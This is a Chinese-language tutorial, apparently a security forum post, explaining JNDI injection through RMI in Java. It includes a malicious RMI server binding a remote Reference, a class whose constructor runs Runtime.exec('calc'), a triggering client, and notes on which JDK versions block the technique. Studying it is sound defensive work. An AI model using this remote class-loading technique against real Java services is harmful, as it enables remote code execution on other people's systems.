jndi有什么用
--------

jndi是用于目录服务的java api,它允许Java客户端通过名称发现和查找数据和资源。直白说就是将名字和对象绑定,通过名字检索对象,对象可以储存在RMI、LDAP、CORBA等等.

JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。

###### jndi的官方架构图如下

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-558ab1332a6a58ec30cb5a044d600be31e78b400.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-558ab1332a6a58ec30cb5a044d600be31e78b400.png)

jndi注入
------

jndi注入就是将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行。基于jndi的利用可以让Fastjson反序列化。

###### 利用条件:客户端的lookup()方法的参数可控和服务端在使用Reference时，classFactoryLocation参数可控

###### jndi注入可以应用的环境:

rmi、通过jndi reference远程调用object方法。  
CORBA IOR 远程获取实现类（Common Object Request Broker Architecture,公共对象请求代理体系结构，通用对象请求代理体系结构 IOR：可互操作对象引用。）  
LDAP 通过序列化对象，JNDI Referene，ldap地址

###### 这篇文章讲一下rmi环境下执行jndi注入，导图如下

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a666802989a976f91d0891a61de8b2fe676a08dd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a666802989a976f91d0891a61de8b2fe676a08dd.png)

构建RMI
-----

###### RMI是什么:

```php
RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。
RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。
这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。
```

###### RMI为什么可以被jndi注入

```java
服务端
IHello rhello = new HelloImpl();
LocateRegistry.createRegistry(1888);
Naming.bind("rmi://0.0.0.0:1888/hello", rhello);
客户端
Registry registry = LocateRegistry.getRegistry("远程服务器地址",1888);
IHello rhello = (IHello) registry.lookup("hello");
rhello.sayHello("test");
```

当客户端访问远程服务器RMI注册表，得到该RMI注册表的对象，此时再访问其中URL中的hello，即可以获得服务器端绑定到hello的类的对象，此时就可以进行调用sayHello方法，其中方法是在服务端执行的，服务端执行结束将返回结果返回给客户端，即在整个流程客户端也就完成了对远程服务器上的对象的使用。服务端将不同的url与类写入RMI注册表,当客户端的jvm想要调用某个类时，可以根据服务端传递过来的url去远程下载类对应的class文件到本地来进行调用。

怎么进行jndi注入
----------

想要通过RMI进行jndi注入,需要构造一个恶意服务端向客户端返回一个Reference对象,Reference是什么呢(它是对于存在命名/目录系统以外的对象的引用,定义为:Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。)通过服务端将恶意的Reference绑定到rmi注册表中指定从远程加载的恶意Factory类,客户端在lookup时就会远程动态加载构造的恶意Factory并实例化

```java
javax.naming.Reference 构造
Reference(String className, String factory, String factoryLocation)
classname:远程加载时所使用的类名
classFactory:加载的class中需要实例化的名称
classFactoryLocation:提供classes数据的地址,可以是file/ftp/http等协议
```

开始构造服务端代码

```java
package demo;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {

    public static void main(String[] args) throws Exception{
        Registry registry= LocateRegistry.createRegistry(7777);

        Reference reference = new Reference("test", "test", "http://localhost/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("calc", wrapper);

    }
}
```

import com.sun.jndi.rmi.registry.ReferenceWrapper的原因是 Reference由于没有实现Remote接口也没有继承UnicasRemoteObject类,所以不能作为远程对象bind到注册中心，需要使用ReferenceWrapper对其实例进行封装

恶意java文件编译为class文件之后放到http服务器上

```java
import java.lang.Runtime;

public class test{
    public test() throws Exception{
        Runtime.getRuntime().exec("calc");
    }
}
```

下面使用客户端访问

```java
package demo;

import javax.naming.InitialContext;

public class JNDI_Test {
    public static void main(String[] args) throws Exception{
        new InitialContext().lookup("rmi://127.0.0.1:7777/calc");
    }
}
```

写好之后先打开服务端文件然后可以使用python直接开启http服务器,最后开启客户端进行访问

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2eeedb755eb907fc9e7bcb9f28d362147523ed17.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2eeedb755eb907fc9e7bcb9f28d362147523ed17.png)

###### 最后贴上jndi的jdk版本要求:

- JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。
- JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。
- JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。